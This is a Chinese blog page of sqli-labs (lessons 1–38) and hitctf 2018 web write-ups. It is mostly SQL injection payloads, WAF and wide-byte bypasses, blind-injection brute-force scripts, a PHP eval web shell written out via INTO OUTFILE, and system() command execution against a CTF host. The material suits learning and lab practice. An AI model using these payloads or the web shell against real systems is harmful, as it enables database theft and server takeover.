preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br></pre></td></tr></table></figure></p>
<p>大小写绕过就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(updatexml(1,concat(0x7e,(sEleCt(password)from(users)where(username=&apos;admin2&apos;)),0x7e),1))and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>依旧是27题的盲注，就不写了</p>
<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>试了半天没回显 最后发现是个盲注 //不按套路走 不是加a才是盲注的吗= =<br>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-28/?id=1&apos;)and(ascii(mid((sElEct(password)from(users)where(username=&apos;admin2&apos;)),%d,1))=%d)and(&apos;1&apos;=&apos;1&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>没看出来和28有啥区别 用28的脚本也能跑出来。。</p>
<h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>很轻松就饶过了。。我咋没看出来the best firewall在哪。。。？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or updatexml(1,concat(0x7e,(select password from users where username=&apos;admin2&apos;),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
<p>看了源码 在login.php中，他会先将参数放入数组，然后读取语句的时候取数组第一个值，对id[1]进行过滤。<br>但是如果我们传入两个id=1&amp;id=2，sql查询的时候会取第二个参数，这样就能绕过waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&apos; union select 1,2,3  %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>上一题的盲注版本，脚本不写了</p>
<h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>和30题同解。。.</p>
<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>宽字节注入<br>单引号前被加了反斜杠转义，无法正常闭合。<br>但是如果使用了GBK编码，那么%df%5c会被认为是一个字，就可以使单引号逃逸。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-32/?id=1%df%27 or updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>和上题一样 </p>
<h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>依旧是宽字节：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%df&apos; or 1=1 %23&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-35?id=1 or updatexml(1,concat(0x7e,user(),0x7e),1) %23</span><br></pre></td></tr></table></figure>
<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>还是宽字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-36?id=1%df&apos; or updatexml(1,concat(0x7e,user(),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
<p>看了下源码，这几个题的不同就在于加反斜杠用了好几种不同的函数。</p>
<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>依旧是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%df&apos; or updatexml(1,concat(0x7e,(user()),0x7e),1)%23&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure></p>
<h3 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h3><p>没看懂他的考点在哪，很轻易就注入成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1=1 %23</span><br><span class="line">?id=-1&apos; union select 1,2,database()%23</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/05/sqli-labs 1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/05/sqli-labs 1/" itemprop="url">
                  sqli-labs (less1-less22)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-02-05 00:00:00" itemprop="dateCreated datePublished" datetime="2018-02-05T00:00:00+08:00">2018-02-05</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-02-10 00:51:16" itemprop="dateModified" datetime="2018-02-10T00:51:16+08:00">2018-02-10</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="用sqlilabs来练练注入"><a href="#用sqlilabs来练练注入" class="headerlink" title="用sqlilabs来练练注入"></a>用sqlilabs来练练注入</h1><p>环境很好配置 网上很多教程</p>
<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>字符型 单引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1=1 %23</span><br></pre></td></tr></table></figure></p>
<p>爆字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; order by 3 %23</span><br><span class="line">?id=1&apos; union select 1,2,3 %23</span><br></pre></td></tr></table></figure></p>
<p>爆表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1%23</span><br></pre></td></tr></table></figure></p>
<p>爆列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1%23</span><br></pre></td></tr></table></figure></p>
<p>查看用户名密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,concat_ws(char(32,32,32),id,username,password) from users limit 0,1 %23</span><br></pre></td></tr></table></figure></p>
<p>(后面只记录payload 暴库方法都差不多)</p>
<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>数字型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1=1%23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>字符型单引号变形<br>查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select login_name, select password from table where id= (‘id’)</span><br></pre></td></tr></table></figure></p>
<p>用’)闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;) or 1=1 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) or 1=1 %23</span><br></pre></td></tr></table></figure>
<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>单引号报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;or 1=1 --+</span><br></pre></td></tr></table></figure></p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select count(*),1, concat(&apos;  &apos;,(select user()), &apos;  &apos;,floor(rand()*2)) as b from information_schema.tables group by b%23</span><br></pre></td></tr></table></figure></p>
<p>试了试其他的报错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23</span><br><span class="line"></span><br><span class="line">?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23</span><br></pre></td></tr></table></figure></p>
<p>都可以<br>但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or exp(~(select * from (select database())a))%23</span><br></pre></td></tr></table></figure></p>
<p>这个语句在wamp环境下爆不出来<br>在lamp下就可以 没研究懂为啥。。。</p>
<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; or 1=1 %23</span><br></pre></td></tr></table></figure>
<h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>导出文件GET字符型注入</p>
<p>这个需要先找到根目录<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径<br>然后把查询结果导入到一个文件里 比如把一句话木马导入到php文件里<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;)) union select 1,&apos;2&apos;,&apos;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&apos; into outfile &apos;E:\\wamp\\www\\sqli-labs\\a.php&apos; %23</span><br></pre></td></tr></table></figure></p>
<p>然后菜刀就OK</p>
<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>布尔盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select database()),1,1))=115 %23 //数据库第一位是s ascii码是115</span><br></pre></td></tr></table></figure></p>
<p>找到payload后写个脚本跑就可以了</p>
<h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>单引号时间盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>双引号时间盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr(database(),1,1))=115,sleep(3),0) %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=Dhakkan&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
<h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=Dhakkan&quot;) or (&quot;1&quot;)=(&quot;1</span><br></pre></td></tr></table></figure>
<h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;) or (&apos;1&apos;)=(&apos;1</span><br></pre></td></tr></table></figure>
<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or 1=1#</span><br></pre></td></tr></table></figure>
<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) or 1=1#</span><br></pre></td></tr></table></figure>
<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>在password处报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin</span><br><span class="line">passwd=&apos; or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23</span><br></pre></td></tr></table></figure></p>
<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p>这关看了半天源码才会 先查数据库找到用户名密码登陆进去<br>回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br></pre></td></tr></table></figure></p>
<p>在UA头处进行注入 单引号尝试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;127.0.0.1&apos;, &apos;admin&apos;)&apos; at line 1</span><br></pre></td></tr></table></figure></p>
<p>然后试试报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&apos;or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<p>成功爆出用户名 剩下的就是常规操作了</p>
<h3 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h3><p>只是把注入点换到了Referer头中，其他的完全一样</p>
<h3 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h3><p>登录后看到重点是在cookie里，加入单引号后报错<br>尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=&apos;or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
<p>成功 其他的和上面一样</p>
<h3 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h3><p>只是在20题的基础上进行了base64编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=dW5hbWU9J29yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgJzEnPScx</span><br></pre></td></tr></table></figure></p>
<h3 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h3><p>20题的基础上，将单引号变成双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=dW5hbWU9Im9yICAoZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpKSkgb3IgIjEiPSIx</span><br></pre></td></tr></table></figure></p>
<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3>
          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/03/hitctf2018/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/03/hitctf2018/" itemprop="url">
                  hitctf-web
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-02-03 00:00:00" itemprop="dateCreated datePublished" datetime="2018-02-03T00:00:00+08:00">2018-02-03</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-03-06 23:20:46" itemprop="dateModified" datetime="2018-03-06T23:20:46+08:00">2018-03-06</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>哈工大新生赛<br>复现一波</p>
<h2 id="PHPreading"><a href="#PHPreading" class="headerlink" title="PHPreading"></a>PHPreading</h2><p>扫描目录发现源码备份index.php.bak<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">eval</span>(base64_decode(<span class="string">'JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw=='</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>解码后提交<br>?asdfgjxzkallgj8852=H1TctF2018EzCTF<br>拿到flag</p>
<h2 id="BabyEval"><a href="#BabyEval" class="headerlink" title="BabyEval"></a>BabyEval</h2><p>给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10013/?str=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以执行 那么久构造命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10013/?str=$&#123;system($_GET[a])&#125;&amp;a=ls</span><br><span class="line">http://120.24.215.80:10013/?str=$&#123;system($_GET[a])&#125;&amp;a=cat%20../../../162920976d9c04ac69e2f4392a8cffbf_flag.txt</span><br></pre></td></tr></table></figure></p>
<p>或者这样也行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10013/?str=$&#123;var_dump(`ls`)&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h2><p>提示在/news/about尝试debug<br>随便输入一个/news/admin 发现报错 给了很多目录<br>尝试/news/auth/ 居然发现了mysql账户密码。。。？？？<br>3306连接进去找到了flag</p>
<h2 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>给了源码 发现他的waf基本让人无处下手<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE username=&apos;&#123;$username&#125;&apos;;&quot;;</span><br><span class="line">echo $query.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line">if (mysqli_num_rows($query) == 1)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    if ($result[&apos;passwd&apos;] == $passwd)&#123;</span><br><span class="line">        die(&apos;you did it and this is your flag: &apos;.$flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&apos;Wrong password&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&apos;Wrong username&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>只需要做到mysql根据username查询到的密码和我们的输入一样就可以了<br>如果我们使用语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 group by passwd with rollup</span><br></pre></td></tr></table></figure></p>
<p>with rollup会产生一个passwd值为NULL的行<br>我们可以根据这点让他返回passwd=NULL的那一行<br>用’=’’绕过用户名 构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;&apos;=&apos;&apos; group by passwd with rollup limit 0,1 #</span><br></pre></td></tr></table></figure></p>
<p>但是limit也不能用 我们可以用having<br>最终payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;&apos;=&apos;&apos; group by passwd with rollup having passwd is NULL #</span><br></pre></td></tr></table></figure></p>
<p>PASSWD交空就行了。</p>
<p>PS：<br>这里没有想明白 select * from users where username=’’=’’ 中 username=’’=’’ 的逻辑问题<br>本地进行了一波研究<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;&apos;=&apos;&apos;</span><br></pre></td></tr></table></figure></p>
<p>全表返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;0&apos;=&apos;&apos;</span><br><span class="line">select * from users where id=&apos;&apos;=&apos;0&apos;</span><br><span class="line">select * from users where id=&apos;&apos;=0</span><br><span class="line">select * from users where id=&apos;&apos;=&apos;a&apos;</span><br></pre></td></tr></table></figure></p>
<p>都是全表返回<br>查看官方文档 字符串在 = 下比较时会被转为int型<br>可以参看PHP弱比较<br>‘1asdas’会转为1<br>‘asddsad’会转为0<br>再看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;1&apos;=&apos;&apos;</span><br></pre></td></tr></table></figure></p>
<p>返回id=1之外的所有数据 那么可以猜想：第二个等号后的数据决定了 返回id值的数据 or 返回这个id值以外的数据。<br>尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;&apos;=1 // 无结果</span><br><span class="line">select * from users where id=&apos;1&apos;=1 // 返回id=1</span><br><span class="line">select * from users where id=&apos;1&apos;=ture//返回id=1</span><br><span class="line">select * from users where id=&apos;1&apos;=false//返回id=1之外的所有</span><br></pre></td></tr></table></figure></p>
<p>那么基本可以确定  id=1=0 中 0相当于后置参数<br>它决定了返回的值，当语句仅为 id=1 时，其实默认了后置参数为1。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1</span><br><span class="line">select * from users where id=1=1</span><br><span class="line">//两个语句是相同的</span><br></pre></td></tr></table></figure></p>
<p>那么可以构造一些万能密码 ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;=false</span><br><span class="line">&apos;=&apos;&apos;</span><br><span class="line">&apos;=&apos;asdasdas&apos;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>大佬博客看来的<br>构造语句爆破密码 ORZ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req=requests.session()</span><br><span class="line">lists=<span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    url=<span class="string">"http://182.254.247.127:2005/"</span></span><br><span class="line">    </span><br><span class="line">    ok=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> lists:</span><br><span class="line">        payload=&#123;<span class="string">"username"</span>:<span class="string">"1'||passwd&lt;'"</span>+flag+s+<span class="string">"'=id#"</span>,<span class="string">"passwd"</span>:<span class="string">""</span>&#125;</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        r1=req.post(url,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username"</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">            ok=s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag+=ok</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>post数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos;||passwd&lt;&apos;9989035e268342af1f40f26aad336623&apos;=id#</span><br><span class="line">&amp;passwd=9989035e268342af1f40f26aad336623</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
